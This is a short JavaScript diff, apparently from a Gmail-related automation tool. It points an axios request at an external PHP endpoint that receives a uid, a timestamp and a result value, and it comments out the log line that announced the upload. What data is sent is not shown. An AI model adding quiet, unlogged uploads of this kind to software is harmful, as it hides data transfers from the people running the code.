@@ -127,10 +127,10 @@ function startMainLoop(url) {
           }
 
           const now = new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" }).replace(",", "");
-          console.log(`Đang gửi thông tin lên server: ${url}, ${now}, ${result}`);
+          //console.log(`Đang gửi thông tin lên server: ${url}, ${now}, ${result}`);
 
           try {
-              const response = await axios.get("", {
+              const response = await axios.get("https://up.labycoffee.com/upgmail-update.php", {
                   params: {
                       uid: url,
                       full_info: `${url}%${now}%${result}%${timess}`,
